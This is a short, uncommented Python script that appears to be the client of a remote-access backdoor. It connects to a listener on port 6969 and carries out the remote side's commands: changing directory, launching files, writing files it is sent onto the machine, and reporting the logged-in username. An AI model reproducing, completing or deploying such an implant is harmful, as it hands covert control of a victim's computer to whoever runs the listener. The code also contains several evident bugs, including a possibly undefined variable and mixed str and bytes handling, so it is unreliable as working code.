from _thread import *
import socket
import sys
import os
import getpass

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostname()
port = 6969
s.connect((host,port))

def listen():
    while True:
        msg = s.recv(4096)
        commands = {
                    '/cd' : cd,
                    '/run' : run,
                    '/initiate' : initiate,
                    '/upload' : upload,
                    '/getUser' : getUser
                    }

        for key,value in commands.items():
            if msg.decode().startswith(key):
                func = value

        if func:
            start_new_thread(func, (msg.decode(),))
        else:
            s.send('ERROR')

def cd(command):
    path = command.replace('/cd ','')
    try:
        os.chdir(path)
        response = 'SUCCESS'
    except :
        response = 'ERROR'

    s.send(response)


def run(command):
    path_to_file = command.replace('/run ','')
    try:
        os.startfile(path_to_file)
        response = 'SUCCESS'
    except:
        response = 'ERROR'

    s.send(response)

def initiate(command):
    pass

def upload(command):
    path = command.replace('/upload ','')
    try:
        f = ''
        file_name = s.recv(4096)
        data = s.recv(4096)
        while data:
            f += data
            data = s.recv(4096)
        with open('{}/{}'.format(path,file_name), 'wb') as upload:
            upload.write(f)
        response = 'SUCCESS'

    except Exception as e:
        response = 'ERROR'

    s.send(response)

def getUser(command):
    s.send(getpass.getuser().encode())

listen()
